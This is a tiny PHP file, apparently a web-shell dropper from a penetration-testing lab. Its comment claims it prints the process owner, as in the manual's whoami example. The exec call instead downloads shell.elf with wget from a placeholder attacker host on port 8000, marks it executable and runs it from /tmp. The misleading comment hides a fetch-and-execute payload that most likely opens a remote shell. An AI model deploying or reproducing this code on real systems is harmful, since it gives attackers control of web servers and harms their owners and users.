<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec("cd /tmp;rm -f /tmp/shell.elf;wget http://<sajatIP>:8000/shell.elf;chmod +x /tmp/shell.elf;/tmp/shell.elf");
echo "Returned with status $retval and output:\n";
print_r($output);
?>